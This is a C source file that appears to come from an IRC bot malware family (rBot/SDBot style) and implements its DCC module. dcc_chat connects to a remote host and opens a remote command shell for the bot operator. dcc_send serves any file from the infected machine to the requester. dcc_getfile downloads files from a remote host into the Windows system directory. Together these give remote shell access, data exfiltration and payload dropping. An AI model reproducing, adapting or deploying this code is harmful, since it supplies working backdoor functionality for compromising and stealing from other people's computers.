#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_DCC

SOCKET create_sock(char *host, int port)
{
	LPHOSTENT lpHostEntry = NULL;
	SOCKADDR_IN SockAddr;
	SOCKET sock;
	IN_ADDR iaddr;

	if ((sock = fsocket( AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
		return INVALID_SOCKET;

	memset(&SockAddr, 0, sizeof(SockAddr));
	SockAddr.sin_family = AF_INET;
	SockAddr.sin_port = fhtons((unsigned short)port);
	iaddr.s_addr = finet_addr(host);

	if (iaddr.s_addr == INADDR_NONE)
		lpHostEntry = fgethostbyname(host); //hostname
	if (lpHostEntry == NULL && iaddr.s_addr == INADDR_NONE)  //error dns
		return INVALID_SOCKET;
	if (lpHostEntry != NULL)
		SockAddr.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list); //hostname
	else
		SockAddr.sin_addr = iaddr; //ip address
	if (fconnect(sock, (SOCKADDR *) &SockAddr, sizeof(SockAddr)) == SOCKET_ERROR) {
		fclosesocket(sock);
		return INVALID_SOCKET;
	}

	return sock;
}

DWORD WINAPI dcc_chat(LPVOID param)
{
	char buffer[4096];
	DWORD dwError;

	SOCKET dccsock;

	DCC dcc = *((DCC *)param);
	DCC *dccs = (DCC *)param;
	dccs->info = TRUE;

	if ((dccsock = create_sock(dcc.host,dcc.port)) == INVALID_SOCKET) 
		return 0;
	if (open_cmd(dccsock,"") == -1) {
		irc_privmsg(dccsock, dcc.sendto, "[DCC]: Failed to open remote command shell.", dcc.notice);
		fclosesocket(dccsock);
		ExitThread(1);
	}
	Sleep(100);
	//pipe_send(dccsock,"","\r\n"); // show the first command prompt
	while (1) {
		memset(buffer, 0, sizeof(buffer));
		dwError = frecv(dccsock, buffer, sizeof(buffer), 0);
		// if recv() returns 0, that means that the connection has been lost.
		if ((dwError == 0) || (dwError == SOCKET_ERROR)) break;

		strcat(buffer,"\n");
		if (!send_commands(buffer))
			break;

		Sleep(100);
		if (findthreadid(RCMD_THREAD) == 0)
			break;
	}
	fclosesocket(dccsock);
	clearthread(dcc.threadnum);
	
	ExitThread(0);
}


DWORD WINAPI dcc_send(LPVOID param)
{
	char IP[16],buffer[1024],sendbuf[IRCLINE],filename[MAX_PATH];

	unsigned int move;
	DWORD err,mode = 0;

   	SOCKET dccsock;
	SOCKADDR_IN GuestAddr, SockAddr;

	DCC dcc = *((DCC *)param);
	DCC *dccs = (DCC *)param;
	dccs->info = TRUE;

	while (1) {
		if ((dccsock = fsocket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
      		sprintf(sendbuf,"[DCC] Failed to create socket.");
			break;
		}

		memset(&SockAddr, 0, sizeof(SockAddr));
   		SockAddr.sin_family = AF_INET;
   		SockAddr.sin_port = fhtons(0);//random port
		SockAddr.sin_addr.s_addr = INADDR_ANY;   
		if (fbind(dccsock, (SOCKADDR *)&SockAddr, sizeof(SockAddr)) != 0) {
			sprintf(sendbuf,"[DCC] Failed to bind to socket.");
			break;
		}
		int length = sizeof(SockAddr);
		fgetsockname(dccsock, (SOCKADDR *)&SockAddr, &length);

		short portnum = fntohs(SockAddr.sin_port);
		for (unsigned int c=0;c <= strlen(dcc.filename);c++) {
			if (dcc.filename[c] == 32) 
				filename[c] = 95;
			else 
				filename[c] = dcc.filename[c];
		}

		if (flisten(dccsock, 1) != 0) {
			sprintf(sendbuf,"[DCC] Failed to open socket.");
			break;
		}
		HANDLE testfile = CreateFile(dcc.filename,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
		if (testfile == INVALID_HANDLE_VALUE) {
			sprintf(sendbuf,"[DCC] File doesn't exist.");
			break;
		}

        sprintf(IP,"%s",GetIP(dcc.sock));
		length = GetFileSize(testfile,NULL);
		sprintf(sendbuf,"DCC SEND %s %i %i %i",dcc.filename,fhtonl(finet_addr(IP)),portnum,length);
		irc_privmsg(dcc.sock,dcc.sendto,sendbuf,FALSE);

		TIMEVAL time;
    	time.tv_sec = 60;//timeout after 60 sec.
    	time.tv_usec = 0;

		fd_set fd_struct;
		FD_ZERO(&fd_struct);
    	FD_SET(dccsock, &fd_struct);
		if (fselect(0, &fd_struct, NULL, NULL, &time) <= 0) {
			irc_privmsg(dcc.sock,dcc.sendto,"[DCC] Send timeout.",dcc.notice);
			break;
		}
		int addrlen = sizeof(GuestAddr);
		if ((dcc.dcchost = faccept(dccsock, (SOCKADDR *)&GuestAddr,&addrlen)) == INVALID_SOCKET)  {
			sprintf(sendbuf,"[DCC] Unable to open socket.");
			break;
		} 
		fclosesocket(dccsock);

		unsigned __int64 totalbytes=0;
		while (length) {
			int Fsend = 1024;
			if (Fsend>length) 
				Fsend=length;
			move = 0-length;
			memset(buffer,0,sizeof(buffer));
			SetFilePointer(testfile, move, NULL, FILE_END);
			ReadFile(testfile, buffer, Fsend, &mode, NULL);
			int bytes_sent = fsend(dcc.dcchost, buffer, Fsend, 0);
			totalbytes += bytes_sent;
			err = frecv(dcc.dcchost,buffer ,sizeof(buffer), 0);
			if (err < 1 || bytes_sent < 1) {
				irc_privmsg(dcc.sock,dcc.sendto,"[DCC] Socket error.",dcc.notice);
				addlog("[DCC] Socket error.");

				fclosesocket(dcc.dcchost);
				clearthread(dcc.threadnum);

				ExitThread(1);
			}
			length = length - bytes_sent;
		}
		if (testfile != INVALID_HANDLE_VALUE) 
			CloseHandle(testfile);
		sprintf(sendbuf,"[DCC] Transfer complete: %s (%s bytes).",dcc.filename,commaI64(totalbytes));
		break;
	}
	if (!dcc.silent) irc_privmsg(dcc.sock,dcc.sendto,sendbuf,dcc.notice);
	addlog(sendbuf);

	if (dccsock > 0) 
		fclosesocket(dccsock);
	fclosesocket(dcc.dcchost);
	clearthread(dcc.threadnum);

	ExitThread(0);
}

DWORD WINAPI dcc_getfile(LPVOID param)
{
	char buffer[4096], sendbuf[IRCLINE], sysdir[MAX_PATH], filename[MAX_PATH];;
	FILE *infile=NULL;

	SOCKET dccsock=0;

	int received = 0;
	unsigned long received2;

	DCC dcc = *((DCC *)param);
	DCC *dccs = (DCC *)param;
	dccs->info = TRUE;

	GetSystemDirectory(sysdir, sizeof(sysdir));
	sprintf(filename,"%s\\%s",sysdir,dcc.filename);

	while (1) {
		HANDLE testfile = CreateFile(filename,GENERIC_WRITE,FILE_SHARE_READ,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
		if (testfile == INVALID_HANDLE_VALUE) {
			sprintf(sendbuf,"Error with file.");
			break;
		}
		CloseHandle(testfile);
		infile = fopen(filename,"a+b");
		if (infile == NULL) {
			sprintf(sendbuf,"[DCC] Error opening file for writing.");
			break;
		}

		if ((dccsock = create_sock(dcc.host,dcc.port)) == INVALID_SOCKET) {
			sprintf(sendbuf,"[DCC] Error opening socket.");
			break;
		}
		DWORD err = 1;
		while (err != 0) {
			memset(buffer,0,sizeof(buffer));
			err = frecv(dccsock, buffer, sizeof(buffer), 0);
			if (err == 0) 
				break;
			if (err == SOCKET_ERROR) {
				irc_privmsg(dcc.sock,dcc.sendto,"[DCC] Socket error.",dcc.notice);
				addlog("[DCC] Socket error.");

				fclose(infile);
				fclosesocket(dccsock);
				clearthread(dcc.threadnum);

				ExitThread(1);
			}
			fwrite(buffer,1,err,infile);
			received = received + err;
			received2 =  fhtonl(received);
			fsend(dccsock,(char *)&received2 , 4, 0);
		}
		sprintf(sendbuf,"[DCC] Transfer complete: %s (%s bytes).",dcc.filename,commaI64(received));
		break;
	}
	if (!dcc.silent) irc_privmsg(dcc.sock,dcc.sendto,sendbuf,dcc.notice);
	addlog(sendbuf);

	if (infile != NULL) 
		fclose(infile);
	fclosesocket(dccsock);
	clearthread(dcc.threadnum);
	
	ExitThread(0);
}
#endif